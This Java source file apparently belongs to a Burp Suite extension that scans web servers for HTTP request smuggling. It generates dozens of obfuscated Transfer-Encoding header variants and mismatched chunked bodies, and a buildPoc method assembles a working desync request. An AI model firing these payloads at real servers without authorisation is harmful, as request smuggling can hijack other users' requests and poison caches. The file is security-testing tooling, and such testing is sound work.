package burp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.zip.GZIPOutputStream;

public abstract class SmuggleScanBox extends Scan {

    ArrayList<String> supportedPermutations;
    static final String PERMUTE_PREFIX = "permute: ";

    SmuggleScanBox(String name) {
        super(name);
        Utilities.globalSettings.registerSetting("convert GET to POST", true);
        Utilities.globalSettings.registerSetting("globally swap - with _", false);
        //Utilities.globalSettings.registerSetting("report dodgy findings", false);
        supportedPermutations = new ArrayList<>();
        // core techniques
        registerPermutation("vanilla");
        registerPermutation("dualchunk");
        registerPermutation("badwrap");
        registerPermutation("space1");
        registerPermutation("badsetupLF");
        registerPermutation("gareth1");

        // niche techniques
        // registerPermutation("underjoin1");
        registerPermutation("spacejoin1");
        //registerPermutation("underscore2");
        registerPermutation("space2");
        registerPermutation("nameprefix1");
        registerPermutation("valueprefix1");
        registerPermutation("nospace1");
        registerPermutation("commaCow");
        registerPermutation("cowComma");
        registerPermutation("contentEnc");
        registerPermutation("linewrapped1");
        registerPermutation("quoted");
        registerPermutation("aposed");
        registerPermutation("badsetupCR");
        registerPermutation("vertwrap");
        registerPermutation("tabwrap");

        // new techniques for AppSec
        registerPermutation("lazygrep");
        registerPermutation("multiCase");
        registerPermutation("0dwrap");
        registerPermutation("0dspam");
        registerPermutation("revdualchunk");
        registerPermutation("nested");
//        registerPermutation("bodysplit");
//        registerPermutation("0dsuffix");
//        registerPermutation("tabsuffix");
//        registerPermutation("UPPERCASE");
//        registerPermutation("reversevanilla");
//        registerPermutation("spaceFF");
//        registerPermutation("accentTE");
//        registerPermutation("accentCH");
//        registerPermutation("unispace");
//        registerPermutation("connection");

        for(int i: getSpecialChars()) {
            registerPermutation("spacefix1:"+i);
        }
        for(int i: getSpecialChars()) {
            registerPermutation("prefix1:"+i);
        }
        for(int i: getSpecialChars()) {
            registerPermutation("suffix1:"+i);
        }
    }

    byte[] setupRequest(byte[] baseReq) {
        if (baseReq[0] == 'G') {
            if (Utilities.globalSettings.getBoolean("convert GET to POST")) {
                baseReq = Utilities.helpers.toggleRequestMethod(baseReq);
            }
            else {
                baseReq = Utilities.addOrReplaceHeader(baseReq, "Content-Type", "application/x-www-form-urlencoded");
                baseReq = Utilities.addOrReplaceHeader(baseReq, "Content-Length", "0");
            }
        }

        return baseReq;
    }

    @Override
    protected List<IScanIssue> doScan(byte[] baseReq, IHttpService service) {
        HashMap<String, Boolean> config;

        ArrayList<String> validPermutations = new ArrayList<>();
        for (String permutation: supportedPermutations) {
            String key = permutation+service.getProtocol()+service.getHost();
            if (BurpExtender.hostsToSkip.containsKey(key)) {
                if (Utilities.globalSettings.getBoolean("skip vulnerable hosts")) {
                    return null;
                }
                else if (Utilities.globalSettings.getBoolean("skip obsolete permutations")) {
                    validPermutations.add(permutation);
                }
            }
        }

        if (validPermutations.isEmpty()) {
            validPermutations.addAll(supportedPermutations);
        }

        for (String permutation: validPermutations) {
            if (!Utilities.globalSettings.getBoolean(PERMUTE_PREFIX+permutation)) {
                continue;
            }

            config = new HashMap<>();
            config.put(permutation, true);
            boolean worked = doConfiguredScan(baseReq, service, config);
            if (worked) {
                String key = permutation+service.getProtocol()+service.getHost();
                BurpExtender.hostsToSkip.putIfAbsent(key, true);
                if (Utilities.globalSettings.getBoolean("skip obsolete permutations")) {
                    break;
                }
            }
        }
        return null;
    }

    abstract boolean doConfiguredScan(byte[] baseReq, IHttpService service, HashMap<String, Boolean> config);

    void registerPermutation(String permutation) {
        supportedPermutations.add(permutation);
        Utilities.globalSettings.registerSetting(PERMUTE_PREFIX+permutation, true);
    }

    static ArrayList<Integer> getSpecialChars() {
        ArrayList<Integer> chars = new ArrayList<>();
//        for (int i=0;i<32;i++) {
//            chars.add(i);
//        }

        chars.add(0); // null
        chars.add(9); // tab
        chars.add(11); // vert tab
        chars.add(12); // form feed
        chars.add(13); // \r
        chars.add(127);
        return chars;
    }

    Resp leftAlive(byte[] req, IHttpService service) {
        byte[] keepalive = Utilities.setHeader(req, "Connection", "keep-alive");
        Resp resp = request(service, keepalive);
        String connectionType = Utilities.getHeader(resp.getReq().getResponse(), "Connection");
        if (connectionType.toLowerCase().contains("alive")) {
            return resp;
        }
        return null;
    }

    static Resp buildPoc(byte[] req, IHttpService service, HashMap<String, Boolean> config) {
        try {
            byte[] badMethodIfChunked = Utilities.setHeader(req, "Connection", "keep-alive");
            badMethodIfChunked = makeChunked(badMethodIfChunked, 1, 0, config, false);

            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            buf.write(badMethodIfChunked);
            buf.write("G".getBytes());

            // first request ends here
            buf.write(makeChunked(req, 0, 0, config, false));
            return new Resp(new Req(buf.toByteArray(), null, service), System.currentTimeMillis());
        }
        catch (IOException e) {
            throw new RuntimeException();
        }
    }

    static byte[] gzipBody(byte[] baseReq) {
        try {
            byte[] req = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "gzip");
            String body = Utilities.getBody(req);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            GZIPOutputStream gzip = new GZIPOutputStream(out);
            gzip.write(Utilities.helpers.stringToBytes(body));
            gzip.close();
            return Utilities.setBody(req, Utilities.helpers.bytesToString(out.toByteArray()));
        } catch (Exception e) {
            Utilities.err(e.getMessage());
            return baseReq;
        }
    }

    static byte[] makeChunked(byte[] baseReq, int contentLengthOffset, int chunkOffset) {
        return makeChunked(baseReq, contentLengthOffset, chunkOffset, new HashMap<>(), false);
    }

    static byte[] makeChunked(byte[] baseReq, int contentLengthOffset, int chunkOffset, HashMap<String, Boolean> settings, boolean malformedClose) {
        if (!Utilities.containsBytes(baseReq, "Transfer-Encoding".getBytes())) {
            baseReq = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "foo");
        }

        byte[] chunkedReq = Utilities.setHeader(baseReq, "Transfer-Encoding", "chunked");


        if (settings.containsKey("underjoin1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding".getBytes(), "Transfer_Encoding".getBytes());
        } else if (settings.containsKey("spacejoin1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding".getBytes(), "Transfer Encoding".getBytes());
        }
        else if (settings.containsKey("space1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding".getBytes(), "Transfer-Encoding ".getBytes());
        }
        else if (settings.containsKey("nameprefix1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding".getBytes(), " Transfer-Encoding".getBytes());
        }
        else if (settings.containsKey("valueprefix1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding:  ".getBytes());
        }
        else if (settings.containsKey("nospace1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding:".getBytes());
        }
//        else if (settings.containsKey("tabprefix1")) {
//            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding:\t".getBytes());
//        }
//        else if (settings.containsKey("vertprefix1")) {
//            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding:\u000B".getBytes());
//        }
        else if (settings.containsKey("commaCow")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: chunked, identity".getBytes());
        }
        else if (settings.containsKey("cowComma")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding: identity, ".getBytes());
        }
        else if (settings.containsKey("contentEnc")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Content-Encoding: ".getBytes());
        }

        else if (settings.containsKey("linewrapped1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding:\n ".getBytes());
        } else if (settings.containsKey("gareth1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding\n : ".getBytes());
        } else if (settings.containsKey("quoted")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: \"chunked\"".getBytes());
        } else if (settings.containsKey("aposed")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: 'chunked'".getBytes());
        } else if (settings.containsKey("badwrap")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Foo: bar".getBytes());
            chunkedReq = Utilities.replace(chunkedReq, "HTTP/1.1\r\n".getBytes(), "HTTP/1.1\r\n Transfer-Encoding: chunked\r\n".getBytes());
        } else if (settings.containsKey("badsetupCR")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Foo: bar".getBytes());
            chunkedReq = Utilities.replace(chunkedReq, "HTTP/1.1\r\n".getBytes(), "HTTP/1.1\r\nFooz: bar\rTransfer-Encoding: chunked\r\n".getBytes());
        } else if (settings.containsKey("badsetupLF")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Foo: bar".getBytes());
            chunkedReq = Utilities.replace(chunkedReq, "HTTP/1.1\r\n".getBytes(), "HTTP/1.1\r\nFooz: bar\nTransfer-Encoding: chunked\r\n".getBytes());
        } else if (settings.containsKey("vertwrap")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding: \n\u000B".getBytes());
        } else if (settings.containsKey("tabwrap")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding: \n\t".getBytes());
        } else if (settings.containsKey("dualchunk")) {
            chunkedReq = Utilities.addOrReplaceHeader(chunkedReq, "Transfer-encoding", "cow");
        } else if (settings.containsKey("lazygrep")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked", "Transfer-Encoding: chunk");
        } else if (settings.containsKey("multiCase")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked", "TrAnSFer-EnCODinG: cHuNkeD");
        } else if (settings.containsKey("UPPERCASE")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked", "TRANSFER-ENCODING: CHUNKED");
        } else if (settings.containsKey("0dwrap")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Foo: bar".getBytes());
            chunkedReq = Utilities.replace(chunkedReq, "HTTP/1.1\r\n".getBytes(), "HTTP/1.1\r\nFoo: bar\r\n\rTransfer-Encoding: chunked\r\n".getBytes());
        } else if (settings.containsKey("0dsuffix")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked", "Transfer-Encoding: chunked\r");
        } else if (settings.containsKey("tabsuffix")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked", "Transfer-Encoding: chunked\t");
        } else if (settings.containsKey("revdualchunk")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked", "Transfer-Encoding: cow\r\nTransfer-Encoding: chunked");
        } else if (settings.containsKey("0dspam")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked", "Transfer\r-Encoding: chunked");
        } else if (settings.containsKey("bodysplit")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked", "X: y");
            chunkedReq = Utilities.addOrReplaceHeader(chunkedReq, "Foo", "barzxaazz");
            chunkedReq = Utilities.replace(chunkedReq, "barzxaazz", "barn\n\nTransfer-Encoding: chunked");
        } else if (settings.containsKey("connection")) {
            chunkedReq = Utilities.addOrReplaceHeader(chunkedReq, "Connection", "Transfer-Encoding");
        } else if (settings.containsKey("nested")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked", "Transfer-Encoding: cow chunked bar");
        }

        if (Utilities.globalSettings.getBoolean("globally swap - with _")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding".getBytes(), "Transfer_Encoding".getBytes());
        }

        for (int i: getSpecialChars()) {
            if (settings.containsKey("spacefix1:"+i)) {
                chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), ("Transfer-Encoding:"+(char) i).getBytes());
            }
        }

        for (int i: getSpecialChars()) {
            if (settings.containsKey("prefix1:"+i)) {
                chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), ("Transfer-Encoding: "+(char) i).getBytes());
            }
        }

        for (int i: getSpecialChars()) {
            if (settings.containsKey("suffix1:"+i)) {
                chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), ("Transfer-Encoding: chunked"+(char) i).getBytes());
            }
        }

        if (settings.containsKey("spaceFF")) {
            try {
                ByteArrayOutputStream encoded = new ByteArrayOutputStream();
                encoded.write("Transfer-Encoding:".getBytes());
                encoded.write((byte) 0xFF);
                chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), encoded.toByteArray());
            } catch (IOException e) {

            }
        }
        if (settings.containsKey("unispace")) {
            try {
                ByteArrayOutputStream encoded = new ByteArrayOutputStream();
                encoded.write("Transfer-Encoding:".getBytes());
                encoded.write((byte) 0xa0);
                chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), encoded.toByteArray());
            } catch (IOException e) {

            }
        }
        if (settings.containsKey("accentTE")) {
            try {
                ByteArrayOutputStream encoded = new ByteArrayOutputStream();
                encoded.write("Transf".getBytes());
                encoded.write((byte) 0x82);
                encoded.write("r-Encoding: ".getBytes());
                chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), encoded.toByteArray());
            } catch (IOException e) {

            }
        }
        if (settings.containsKey("accentCH")) {
            try {
                ByteArrayOutputStream encoded = new ByteArrayOutputStream();
                encoded.write("Transfer-Encoding: ch".getBytes());
                encoded.write((byte) 0x96);
                chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chu".getBytes(), encoded.toByteArray());
            } catch (IOException e) {

            }
        }

        String ending = "0\r\n\r\n";
        if (malformedClose) {
            if (Utilities.globalSettings.getBoolean("risky mode")) {
                ending = "1\r\nZ\r\n0\r\n\r\n";
            }
            else {
                ending = "1\r\nZ\r\nQ\r\n\r\n";
            }
        }

        int bodySize = baseReq.length - Utilities.getBodyStart(baseReq);
        String body = Utilities.getBody(baseReq);
        int chunkSize = bodySize+chunkOffset;
        if (chunkSize > 0) {
            chunkedReq = Utilities.setBody(chunkedReq, Integer.toHexString(chunkSize) + "\r\n" + body + "\r\n"+ending);
        }
        else {
            chunkedReq = Utilities.setBody(chunkedReq, ending);
        }
        bodySize = chunkedReq.length - Utilities.getBodyStart(chunkedReq);
        String newContentLength = Integer.toString(bodySize+contentLengthOffset);

        chunkedReq = Utilities.setHeader(chunkedReq, "Content-Length", newContentLength);
        if (settings.containsKey("reversevanilla")) {
            chunkedReq = Utilities.replace(chunkedReq, "Content-Length", "oldContentLength");
            chunkedReq = Utilities.addOrReplaceHeader(chunkedReq, "Content-Length", newContentLength);
        }

        // fixme breaks stuff
//        if (settings.containsKey("underscore2")) {
//            chunkedReq = Utilities.replace(chunkedReq, "Content-Length".getBytes(), "Content_Length".getBytes());
//        }
//        else if (settings.containsKey("space2")) {
//            chunkedReq = Utilities.replace(chunkedReq, "Content-Length".getBytes(), "Content-Length ".getBytes());
//        }

        return chunkedReq;
    }


    //    boolean sendPoc(String name, byte[] setupAttack, byte[] victim, IHttpService service) {
//        return sendPoc(name, Utilities.helpers.bytesToString(setupAttack), victim, service, new HashMap<>());
//    }
//
//    boolean sendPoc(String name, byte[] setupAttack, byte[] victim, IHttpService service, HashMap<String, Boolean> config) {
//        return sendPoc(name, Utilities.helpers.bytesToString(setupAttack), victim, service, config);
//    }
//
//
//    boolean sendPoc(String name, String setupAttack, byte[] victim, IHttpService service, HashMap<String, Boolean> config) {
//        try {
//            Resp baseline = request(service, victim);
//            SmuggleHelper helper = new SmuggleHelper(service);
//            helper.queue(setupAttack);
//            helper.queue(Utilities.helpers.bytesToString(victim));
//            helper.queue(Utilities.helpers.bytesToString(victim));
//
//            List<Resp> results = helper.waitFor();
//            Resp cleanup = null;
//            for (int i=0;i<3;i++) {
//                cleanup = request(service, victim);
//                if (cleanup.getInfo().getStatusCode() != baseline.getInfo().getStatusCode()) {
//                    request(service, victim);
//                    break;
//                }
//            }
//            short cleanupStatus = cleanup.getStatus();
//            short minerStatus = results.get(0).getStatus();
//            short victimStatus = results.get(1).getStatus();
//
//            if (cleanupStatus == minerStatus && minerStatus == victimStatus) {
//                return false;
//            }
//
//            String issueTitle;
//            String issueDescription = "";
//
//            if (cleanupStatus == minerStatus) {
//                if (victimStatus == 0) {
//                    issueTitle = "Null victim";
//                }
//                else {
//                    issueTitle = "Req smuggling attack (legit)";
//                }
//            } else if (minerStatus == victimStatus) {
//                issueTitle = "Req smuggling attack (XCON)";
//            } else if (cleanupStatus == victimStatus) {
//                issueTitle = "Attack timeout";
//            } else {
//                issueTitle = "Req smuggling attack (hazardous)";
//            }
//
//
//            helper = new SmuggleHelper(service);
//            final int randomCheckCount = 7;
//            for (int i=0; i<randomCheckCount;i++) {
//                helper.queue(Utilities.helpers.bytesToString(victim));
//            }
//            List<Resp> cleanResults = helper.waitFor();
//            for (int i=1; i<randomCheckCount;i++) {
//                if (cleanResults.get(i-1).getStatus() != cleanResults.get(i).getStatus()) {
//                    if (!Utilities.globalSettings.getBoolean("report dodgy findings")) {
//                        return false;
//                    }
//                    issueTitle += " (dodgy)";
//                    break;
//                }
//            }
//
//            issueTitle += ": "+name + " -";
//
//            issueTitle += String.join("|", config.keySet());
//
//            report(issueTitle, issueDescription, cleanup, results.get(0), results.get(1));
//
//            BurpExtender.hostsToSkip.putIfAbsent(service.getHost(), true);
//            return true;
//        }
//        catch (Exception e) {
//            return false;
//        }
//    }

}
